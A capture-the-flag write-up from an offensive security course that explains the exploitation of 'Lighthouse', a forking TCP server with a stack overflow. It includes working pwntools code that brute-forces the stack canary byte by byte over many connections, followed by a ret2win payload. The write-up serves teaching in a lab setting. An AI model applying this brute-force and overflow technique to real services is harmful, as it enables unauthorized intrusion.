# Lighthouse

**Category:** pwn / remote canary brute force (forking server, menu-driven) · **Course:** Offensive Security (PoliTo)

## Challenge

A small "control panel" TCP server: a forking accept loop presents a 1/2 menu, and choice `1` reads a signal-log entry into a 128-byte buffer with `read(fd, buf, 0x200)`.

## Vulnerability

Third instance of the same design flaw in this lab set: `fork()` per connection without re-exec, so the stack canary is identical across every child. A crash silently drops the connection; success echoes `Log entry recorded. Over and out.`, giving a clean oracle for a byte-by-byte brute force.

## Exploitation

1. Brute-force the 8-byte canary via the forking-server oracle. The first byte is the fixed `\x00`, so 7 remain. For each guess, connect, send the `1` menu choice to reach `vuln()`, then send `b"A" * 136 + guess`; if the response contains `Log entry recorded. Over and out.`, the byte survived the canary check.
2. Send the winning payload: **136 bytes** of padding, the recovered canary, 8 bytes of saved-RBP filler (saved RIP is at 136 + 8 + 8 = 152), a bare `ret` gadget (`0x40101a`) for 16-byte stack alignment, then `win()`.

The byte-at-a-time oracle (as in `solve.py`):

```python
known = b"\x00"                                       # canary's first byte is always NUL
for i in range(7):
    for bval in range(256):
        guess   = known + bytes([bval])
        payload = b"A" * OFFSET_TO_CANARY + guess      # OFFSET_TO_CANARY = 136
        io = remote(HOST, PORT, level='error')
        io.recvuntil(b"> ")
        io.sendline(b"1")                             # menu: record signal log -> vuln()
        io.recvuntil(b"Enter your signal log entry: ")
        io.send(payload)
        data = io.recvall(timeout=0.5)
        io.close()
        if b"Log entry recorded. Over and out." in data:
            known = guess
            break
canary = u64(known.ljust(8, b"\x00"))
```

Final exploit with the recovered canary:

```python
payload = flat(
    b"A" * OFFSET_TO_CANARY,    # 136
    canary,
    b"B" * 8,                   # saved-RBP filler
    RET,                        # 0x40101a, stack alignment
    elf.sym.win,
)
```

## Files

- `main.c` — challenge source
- `lighthouse` — compiled challenge binary
- `solve.py` — working exploit (pwntools); the brute-force loop recovers the canary over ~256 × 7 connections

## Flag

`offsec{...redacted...}` — captured against the remote instance; redacted here per standard write-up etiquette.
